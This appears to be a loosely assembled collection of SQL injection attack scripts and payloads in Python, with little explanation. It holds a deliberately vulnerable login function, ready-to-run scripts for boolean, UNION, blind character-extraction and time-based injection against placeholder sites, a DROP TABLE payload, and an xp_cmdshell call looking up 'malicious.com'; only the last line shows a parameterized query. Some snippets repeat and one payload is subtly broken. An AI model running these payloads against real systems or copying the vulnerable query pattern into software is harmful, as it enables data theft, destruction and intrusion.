# Username: admin'; DROP TABLE users; --

import mysql.connector

def login(username, password):
    try:
        conn = mysql.connector.connect(
            host="localhost",
            user="root",
            password="password",
            database="mydatabase"
        )
        cursor = conn.cursor()
        
        # Vulnerable SQL query
        query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(username, password)
        
        cursor.execute(query)
        result = cursor.fetchall()
        
        if len(result) > 0:
            print("Login successful!")
        else:
            print("Invalid credentials!")
        
        conn.close()
    
    except mysql.connector.Error as error:
        print("Error connecting to MySQL: {}".format(error))

username = input("Enter username: ")
password = input("Enter password: ")
login(username, password)

import requests

# The vulnerable website URL
url = "http://example.com/login"

# The payload for the SQL injection attack
payload = "' OR '1'='1' -- "

# The login credentials
username = "admin"
password = "password"

# The malicious SQL injection attack
data = {
    "username": username + payload,
    "password": password
}

# Sending the malicious request
response = requests.post(url, data=data)

# Checking if the attack was successful
if "Login successful" in response.text:
    print("Congratulations! You've successfully bypassed the login system.")
else:
    print("Oops! The SQL injection attack failed. Try a different payload.")

# Username: admin' AND '1'='1'; --

import requests

url = "http://www.targetwebsite.com/login"
payload = "' OR '1'='1' UNION SELECT NULL,username,password FROM users -- "

response = requests.post(url, data={"username": payload, "password": "password"})

if "Successful login" in response.text:
    print("Blind SQL Injection successful!")
else:
    print("Injection failed.")

def check_if_true(payload):
    url = "https://example.com/login" 
    username = f"admin' AND {payload} AND '1'='1'"
    password = "password"

    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)
    return "Login Successful" in response.text

def exploit_blind_sqli():
    payload = "SELECT COUNT(*) FROM users WHERE username LIKE 'a%'"
    result = ""

    for i in range(1, 50):
        if check_if_true(payload + f" AND LENGTH(username)={i}"):
            for j in range(32, 127):
                if check_if_true(payload + f" AND ASCII(SUBSTRING(username, {i}, 1))={j}"):
                    result += chr(j)
                    break

    return result

print(exploit_blind_sqli())

# Username: admin' AND IF(1=1, SLEEP(5), 0); --

import requests
import time

def perform_time_based_sqli(url):
    # The vulnerable parameter in the URL
    vulnerable_param = "id"

    # The payload for time-based SQL injection
    payload = f"' OR SLEEP(5) OR '{time.sleep(0.5)}"

    # Craft the malicious URL
    malicious_url = f"{url}?{vulnerable_param}={payload}"

    # Send the request and measure the response time
    start_time = time.time()
    response = requests.get(malicious_url)
    end_time = time.time()

    # Check if the response time indicates successful injection
    if end_time - start_time > 5:
        print("Time-based SQL injection successful!")
    else:
        print("Injection failed.")

# Usage example
target_url = "http://example.com/vulnerable.php"
perform_time_based_sqli(target_url)

import requests
import time

def perform_time_based_sqli(url):
    payload = "' OR SLEEP(5) -- "
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()

    if end_time - start_time > 4:
        print("The website is vulnerable to Time-Based SQL Injection!")
    else:
        print("The website is not vulnerable to Time-Based SQL Injection.")


target_url = "https://www.example.com/somepage.php?id="

perform_time_based_sqli(target_url)

import requests
import time

url = "https://example.com/vulnerable-page.php"
injection_point = "id"
query_delay = 5

def perform_injection(injection_value):
    payload = f"1' AND SLEEP({query_delay}) -- -"
    params = {injection_point: payload}
    start_time = time.time()
    response = requests.get(url, params=params)
    end_time = time.time()
    elapsed_time = end_time - start_time

    if elapsed_time >= query_delay:
        print(f"The injection value {injection_value} is correct.")
    else:
        print(f"The injection value {injection_value} is incorrect.")

# Example usage
injection_value = "admin' OR '1'='1"
perform_injection(injection_value)

# Username: admin' OR 1=1; --

import requests

# The vulnerable website URL
url = "http://example.com/vulnerable_page.php"

# The payload for the SQL injection attack
payload = "' OR 1=1; -- "

# The complete URL with the payload
injected_url = f"{url}?id={payload}"

# Send the request and print the response
response = requests.get(injected_url)
print(response.text)

import requests

def perform_injection(url, query):
    payload = f"' OR {query}--"
    modified_url = url.replace("PARAMETER", payload)
    response = requests.get(modified_url)
    
    if "Error" in response.text:
        print("[+] Injection successful!")
    else:
        print("[-] Injection failed.")

# Usage example
url = "https://example.com/somepage?param=PARAMETER"
query = "SELECT COUNT(*) FROM users WHERE username = 'admin' AND 1=0 UNION SELECT 1--"

perform_injection(url, query)

Input: ' UNION SELECT username, password FROM users; --

import requests

def union_based_injection(url, query):
    # Craft the payload for Union-Based SQL Injection
    payload = f"' UNION SELECT {query}-- "

    # Send the malicious request
    response = requests.get(url + payload)

    # Process and display the response
    print(response.text)

# Usage Example
url = "http://example.com/sqli-vulnerable-page"
query = "column1, column2, column3 FROM users"
union_based_injection(url, query)

import requests

def perform_union_based_attack(url, vulnerable_parameter):
    payload = "' UNION SELECT 1,2,3,4,5,username,password FROM users -- "
    params = {vulnerable_parameter: payload}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print("Successful Union-Based SQL Injection! Here are the results:")
        print(response.text)
    else:
        print("Injection failed. Maybe the website is patched or not vulnerable.")

# Usage example
target_url = "https://example.com/login.php"
vulnerable_param = "username"
perform_union_based_attack(target_url, vulnerable_param)

# DNS-based
Input: '; EXEC xp_cmdshell('nslookup malicious.com'); --

import requests

def union_based_injection(url, query):
    # Craft the payload for Union-Based SQL Injection
    payload = f"' UNION SELECT {query}-- "

    # Send the malicious request
    response = requests.get(url + payload)

    # Process and display the response
    print(response.text)

# Usage Example
url = "http://example.com/sqli-vulnerable-page"
query = "column1, column2, column3 FROM users"
union_based_injection(url, query)

cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (user_input_username, user_input_password))
